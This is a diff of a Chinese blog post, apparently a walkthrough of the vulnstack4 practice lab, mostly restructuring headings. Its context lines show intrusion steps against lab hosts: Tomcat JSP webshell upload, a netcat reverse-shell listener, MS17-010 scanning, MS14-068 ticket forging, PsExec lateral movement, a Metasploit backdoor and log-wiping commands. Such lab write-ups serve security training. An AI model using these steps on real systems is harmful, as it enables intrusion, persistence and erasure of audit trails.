@@ -30,7 +30,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-06-04T08:07:05.000Z">
-<meta property="article:modified_time" content="2025-06-04T11:12:00.059Z">
+<meta property="article:modified_time" content="2025-06-04T11:29:15.036Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
@@ -396,8 +396,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-06-04 19:12</span>
-            <span class="mobile">2025-06-04 19:12</span>
+            <span class="desktop">2025-06-04 19:29:15</span>
+            <span class="mobile">2025-06-04 19:29:15</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -435,7 +435,7 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.8k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.9k Words</span>
         </span>
     
     
@@ -474,7 +474,7 @@
                      data-src="/./../images/image-20250601160327178.png"
                       alt="image-20250601160327178"
                 ></p>
-<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.86.131</span><br></pre></td></tr></table></figure></div>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.86.131</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -546,8 +546,7 @@
 <p>下面看</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.131:2002/</span><br></pre></td></tr></table></figure></div>
 
-<p>tomcat的打法</p>
-<p><img  
+<h4 id="tomcat的打法"><a href="#tomcat的打法" class="headerlink" title="tomcat的打法"></a>tomcat的打法</h4><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/./../images/image-20250601181833028.png"
@@ -593,7 +592,7 @@
                 ></p>
 <p>成功弹回shell</p>
 <p>不用msf集成模块打的话就用抓包改get方式为put方式传jsp马，可以文件流绕过，可以空格绕过，可以”&#x2F;“绕过，我用”&#x2F;“绕过上去用webshell连接即可</p>
-<p>再看一下2003端口</p>
+<h4 id="phpmyadmin打法"><a href="#phpmyadmin打法" class="headerlink" title="phpmyadmin打法"></a>phpmyadmin打法</h4><p>再看一下2003端口</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -656,7 +655,7 @@
                      data-src="/./../images/image-20250604190942164.png"
                       alt="image-20250604190942164"
                 ></p>
-<p>这里由于 docker 环境缺少太多必要的东西导致无法成功逃逸，并且提取成功无法切换用户</p>
+<h4 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h4><p>这里由于 docker 环境缺少太多必要的东西导致无法成功逃逸，并且提取成功无法切换用户</p>
 <p>因为前文提到我们拿到的(tomcat)shell是处于docker环境中的</p>
 <p>执行</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure></div>
@@ -720,7 +719,7 @@
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure></div>
 
 <p>ok 监听7777 弹回shell 下面做内网信息搜集</p>
-<h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><p>双网卡的ubuntu</p>
+<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>双网卡的ubuntu</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -832,7 +831,7 @@
                      data-src="/./../images/image-20250603121339420.png"
                       alt="image-20250603121339420"
                 ></p>
-<p>两台机器都开放了445，那不得不试一下永恒之蓝了,看一下是否存在</p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>两台机器都开放了445，那不得不试一下永恒之蓝了,看一下是否存在</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhost 192.168.183.128</span><br></pre></td></tr></table></figure></div>
 
 <p>win7</p>
@@ -948,7 +947,7 @@
 <p>gpt的解释如下</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你之所以一直看到 “SMB Login Error” 并且绑定端口也连不上，根本原因是：SMB（445）和 Shell 绑定（4444/4446）流量都被 proxychains 强行走了 SOCKS5，导致 Metasploit 无法跟目标做原生的 SMB 握手，也无法完成反弹连接。</span><br></pre></td></tr></table></figure></div>
 
-<p>用chisel挂代理试试</p>
+<h3 id="chisel代理"><a href="#chisel代理" class="headerlink" title="chisel代理"></a>chisel代理</h3><p>用chisel挂代理试试</p>
 <p>在kali上</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 6666 --reverse</span><br></pre></td></tr></table></figure></div>
 
@@ -1020,8 +1019,7 @@
                 ></p>
 <p>至此成功拿下win7主机</p>
 <p><del>累死主包了</del></p>
-<p>域内信息收集</p>
-<p><img  
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/./../images/image-20250604171421701.png"
@@ -1071,7 +1069,7 @@
                      data-src="/./../images/image-20250604172937228.png"
                       alt="image-20250604172937228"
                 ></p>
-<p>MS14-068操作步骤</p>
+<h3 id="拿到win7权限"><a href="#拿到win7权限" class="headerlink" title="拿到win7权限"></a>拿到win7权限</h3><p>MS14-068操作步骤</p>
 <p>1.生成高权限票据</p>
 <p>格式：MS14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></table></figure></div>
@@ -1092,7 +1090,7 @@
                       alt="image-20250604173505817"
                 ></p>
 <p>导入后再psexec横向移动试试</p>
-<p>3.psexec横向移动</p>
+<h3 id="psexec横向移动"><a href="#psexec横向移动" class="headerlink" title="psexec横向移动"></a>psexec横向移动</h3><p>3.psexec横向移动</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe /accepteula /s \\WIN-ENS2VR5TR3N cmd</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
@@ -1108,8 +1106,7 @@
                      data-src="/./../images/image-20250604173815790.png"
                       alt="image-20250604173815790"
                 ></p>
-<p>权限维持</p>
-<p>我们利用msf制作一个后门</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>我们利用msf制作一个后门</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -1157,8 +1154,7 @@
                      data-src="/./../images/image-20250604181753732.png"
                       alt="image-20250604181753732"
                 ></p>
-<p>痕迹清理</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">主要是将两台Windows主机的日志清除，ubuntu主机的上传文件、webshell删除</span><br><span class="line">wevtutil cl system</span><br><span class="line"></span><br><span class="line">wevtutil cl security</span><br><span class="line"></span><br><span class="line">wevtutil cl setup</span><br><span class="line"></span><br><span class="line">wevtutil cl application</span><br><span class="line"></span><br><span class="line">接下来在web主机查找日志文件并批量删除</span><br><span class="line">find / -name *.log -exec rm -rf &#123;&#125; \;</span><br><span class="line">find / -name *.log -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure></div>
+<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">主要是将两台Windows主机的日志清除，ubuntu主机的上传文件、webshell删除</span><br><span class="line">wevtutil cl system</span><br><span class="line"></span><br><span class="line">wevtutil cl security</span><br><span class="line"></span><br><span class="line">wevtutil cl setup</span><br><span class="line"></span><br><span class="line">wevtutil cl application</span><br><span class="line"></span><br><span class="line">接下来在web主机查找日志文件并批量删除</span><br><span class="line">find / -name *.log -exec rm -rf &#123;&#125; \;</span><br><span class="line">find / -name *.log -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure></div>
 
 <p><del>渗透测试结束，系统十分安全</del></p>
 
@@ -1175,7 +1171,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-06-04 19:12:00
+                    :</strong> 2025-06-04 19:29:15
             </li>
         
         <li>
@@ -1238,7 +1234,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">红日靶场4</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnstack4"><span class="nav-text">vulnstack4</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnstack4"><span class="nav-text">vulnstack4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">内网信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-text">内网渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chisel%E4%BB%A3%E7%90%86"><span class="nav-text">chisel代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">域内信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E5%88%B0win7%E6%9D%83%E9%99%90"><span class="nav-text">拿到win7权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#psexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-text">psexec横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-text">痕迹清理</span></a></li></ol></li></ol>
 
 	</div>
 </div>
@@ -1271,7 +1267,7 @@
                     </span>
                     
                         <span>
-                            25.4k words in total
+                            25.5k words in total
                         </span>
                     
                 </p>
